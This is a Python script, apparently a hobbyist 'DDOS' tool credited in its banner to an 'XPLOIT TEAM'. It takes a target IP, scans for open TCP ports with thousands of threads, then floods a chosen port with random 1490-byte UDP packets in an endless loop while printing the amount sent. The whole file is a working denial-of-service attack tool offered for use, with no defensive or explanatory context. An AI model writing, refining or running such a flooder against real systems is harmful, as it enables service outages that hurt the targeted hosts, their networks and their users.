import socket, threading, os, sys, random, ctypes, time
from colorama import init, Fore, Back, Style 

delay=20
psc=5000
ux=3
port = 1
sent = 0
id=1
svc=[]



sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
if os.name=='nt':
    os.system('color b')
    os.system('Hate You')
    ctypes.windll.kernel32.SetConsoleTitleW('Hate')
else:
    os.system('setterm -background white -foreground white -store')

def cls():
    os.system('cls' if os.name=='nt' else 'clear')
cls()

def type(text):
  words = text
  for char in words:
    time.sleep(0.01)
    sys.stdout.write(char)
    sys.stdout.flush()
  
print()    

print(Style.BRIGHT + Fore.BLUE + """██████████   ██████████      ███████     █████████ 
░░███░░░░███ ░░███░░░░███   ███░░░░░███  ███░░░░░███
 ░███   ░░███ ░███   ░░███ ███     ░░███░███    ░░░ 
 ░███    ░███ ░███    ░███░███      ░███░░█████████ 
 ░███    ░███ ░███    ░███░███      ░███ ░░░░░░░░███
 ░███    ███  ░███    ███ ░░███     ███  ███    ░███
 ██████████   ██████████   ░░░███████░  ░░█████████ 
░░░░░░░░░░   ░░░░░░░░░░      ░░░░░░░     ░░░░░░░░░""") 

print()                                                                 
print(Fore.GREEN + """               ╔═════════════════════╗
                    BY CHOIRU 
                     XPLOIT TEAM
               ╚═════════════════════╝""")


print()
print("╔═══════════════════════════════════════════════════╗")
print()
type("││ target ip")
print()
ip = input("││ :")
ipp=ip
target=ip



if len(sys.argv) == 2:
    target = socket.gethostbyname(sys.argv[1])


def TCP_connect(ipp, port_number, delay, output):
    TCPsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    TCPsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    TCPsock.settimeout(delay)
    try:
        TCPsock.connect((ipp, port_number))
        output[port_number] = 'Listening'
    except:
        output[port_number] = ''

def scan_ports(ipp, delay):

    threads = []
    output = {}


    for i in range(psc):
        t = threading.Thread(target=TCP_connect, args=(ipp, i, delay, output))
        threads.append(t)


    for i in range(psc):
        threads[i].start()


    for i in range(psc):
        threads[i].join()

    for i in range(psc):
        if output[i] == 'Listening':
            svc.append(int(i))


def main():
    print()
    print("╔═══════════════════════════════════════════════════╗")
    print()
    type("││ timeout seconds (20 recommended)")
    print()
    delay = int(input("││ :"))
    print()
    print("╔═══════════════════════════════════════════════════╗")
    print()
    type("││ port scan precision (3 recommended)")
    print()
    ux = int(input("││ :"))
    print()
    print("╔═══════════════════════════════════════════════════╗")
    print()
    type("││ port scan interval (5000 recommended,65535 max)")
    print()
    psc=int(input("││ :"))
    print()
    print("╔═══════════════════════════════════════════════════╗")
    print()

    type("││ scanning for around ")
    print(delay*ux+(psc*0.002),end=" ")
    type("seconds")
    print()
    for kk in range(ux):
        scan_ports(ipp, delay)
        type("││ Phase ")
        print(str(kk+1),end="")
        type(" complete")
        print()

if __name__ == "__main__":
    main()

res = [*set(svc)]
print()
print("╔═══════════════════════════════════════════════════╗")
print()
type("││ open ports=")
print(res)

type("││ choose port")
print()

open=int(input("││ :"))
print()

print("╔═══════════════════════════════════════════════════╗")
print()
type("││ package size(minimum 5000)")
print()
threads=int(input("││ :"))
if threads<5000:
    sys.exit("thread smaller than 5000")
c=(sent+int(threads/100)*100.44)/100
sentstring=round(sent,1)



if os.name=='nt':
    print("││ check task manager ││")
else:
    print("││ check the traffic ││")


nx=len(("││ ID:%s  │  Sent %sMB to %s port:%s"%(str((id)).zfill(4),c,ipp,open)))
print("―"*nx) 

while True:
     for i in range(int(threads/5000)):
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
         sock.sendto(bytes, (ipp,int(open)))
    
        
        
        
        
        
     print("││ ID:%s  │  Sent %sMB to %s port:%s"%(str((id)).zfill(4),c,ipp,open))
     id+=1
     if id%100==0 or id>100 and id%1000==0:
         nx=len(("││ ID:%s  │  Sent %sMB to %s port:%s"%(str((id)).zfill(4),c,ipp,open)))
         print("―"*nx)